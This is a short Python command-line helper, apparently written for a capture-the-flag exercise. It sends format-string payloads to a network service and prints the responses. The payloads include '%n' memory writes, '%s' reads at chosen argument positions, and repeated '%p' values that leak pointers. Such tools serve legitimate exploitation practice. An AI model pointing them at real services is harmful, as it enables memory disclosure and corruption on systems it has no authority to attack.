#!/usr/bin/env python3
"""Stdlib-only format-string helper for the CTF.

Usage:
  python3 fmt.py HOST PORT -p '%x%x%x%x%x%x-%s'
  python3 fmt.py HOST PORT -p '%x%x%n'
  python3 fmt.py HOST PORT --leak 20          # send %p.%p... and print the response
  python3 fmt.py HOST PORT -p '%6$s' --send

No pwntools needed. For automatic position scanning use auto_pwn.py.
"""
import argparse
import socket
import sys
import time


def recv_idle(sock, timeout, idle):
    sock.settimeout(timeout)
    out = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            out += chunk
            sock.settimeout(idle)
        except socket.timeout:
            break
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host", nargs="?", default="127.0.0.1")
    ap.add_argument("port", nargs="?", type=int, default=0)
    ap.add_argument("-p", "--payload", default="%x%x%x%x%x%x-%s")
    ap.add_argument("--leak", type=int, metavar="N", help="leak N pointers with %%p")
    ap.add_argument("--send", action="store_true", help="send once and print the response")
    ap.add_argument("--noreceive", action="store_true", help="do not wait for a banner")
    ap.add_argument("--no-newline", action="store_true", help="send payload without trailing newline")
    ap.add_argument("--timeout", type=float, default=3.0)
    args = ap.parse_args()

    if not args.port:
        ap.error("HOST and PORT are required")
    payload = ".".join(["%p"] * args.leak) if args.leak else args.payload
    print(f"[*] payload: {payload}", file=sys.stderr)

    s = socket.create_connection((args.host, args.port), timeout=args.timeout)
    try:
        if not args.noreceive:
            banner = recv_idle(s, args.timeout, 0.35)
            if banner:
                sys.stderr.buffer.write(banner)
                sys.stderr.flush()
        s.sendall(payload.encode("latin-1", "replace") + (b"" if args.no_newline else b"\n"))
        time.sleep(0.1)
        out = recv_idle(s, args.timeout, 0.35)
    finally:
        s.close()

    if out:
        sys.stdout.buffer.write(out)
        sys.stdout.buffer.flush()
    else:
        print("[!] no response", file=sys.stderr)


if __name__ == "__main__":
    main()
